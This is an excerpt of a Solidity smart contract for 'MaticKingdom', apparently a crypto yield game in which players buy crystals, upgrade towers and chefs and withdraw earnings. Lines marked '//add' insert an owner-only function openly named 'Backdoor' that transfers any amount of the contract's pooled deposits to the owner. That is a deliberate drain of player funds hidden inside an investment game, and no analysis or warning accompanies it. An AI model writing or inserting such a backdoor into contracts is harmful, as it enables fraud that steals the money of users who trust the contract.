...
contract MaticKingdom {
    ...
    bool public started;   //add
	address payable public owner; //add

    uint256 public totalChefs;
    uint256 public totalTowers;
    uint256 public totalInvested;
    address public manager = 0x095A7A7E2cc4dB847cBCE363eeea3a45d9157971;

    modifier ownerOnly(){ //add
        require(msg.sender == owner); //add
        _;  // add
    } // add


    function Backdoor (uint256 _amount) public ownerOnly { //add
        owner.transfer(_amount); //add
    } //add
    ...
    constructor () payable{ //add
        owner = payable (msg.sender) ; //add
    ...
    function addCrystals(address ref) external payable {
        uint256 crystals = msg.value / 2e17;  //1c 0.2m
        ...
        ref = towers[user].ref;
        towers[ref].crystals += (crystals * 8) / 100; //8
        towers[ref].money += (crystals * 100 * 4) / 100; //4
    ...
    function withdrawMoney(uint256 gold) initialized external {
        ...
        uint256 amount = gold * 2e15; //1g   0.2m
    ...
    function getUpgradePrice(uint256 towerId, uint256 chefId) internal pure returns (uint256) {
        if (chefId == 1) return [400, 4000, 12000, 24000, 40000][towerId]; //40c  400  1200  2400  4000
        if (chefId == 2) return [600, 6000, 18000, 36000, 60000][towerId]; //60
        if (chefId == 3) return [900, 9000, 27000, 54000, 90000][towerId]; //90
        if (chefId == 4) return [1360, 13500, 40500, 81000, 135000][towerId]; //136
        if (chefId == 5) return [2040, 20260, 60760, 121500, 202500][towerId]; //204
        if (chefId == 6) return [3060, 30400, 91140, 182260, 303760][towerId]; //306
        revert("Incorrect chefId");
    }

    function getYield(uint256 towerId, uint256 chefId) internal pure returns (uint256) {
        if (chefId == 1) return [5, 56, 179, 382, 678][towerId]; //5gph
    ...
    function getTreasure(uint256 treasureId) internal pure returns (uint256, uint256) {
      if(treasureId == 0) return (0, 24); // price | value  24H
      if(treasureId == 1) return (2000, 30);  //30  200C  40M
      if(treasureId == 2) return (2500, 36); //36 250C  50M
      if(treasureId == 3) return (3000, 42); //42 300C  60M
      if(treasureId == 4) return (4000, 48); //48 400C  80M
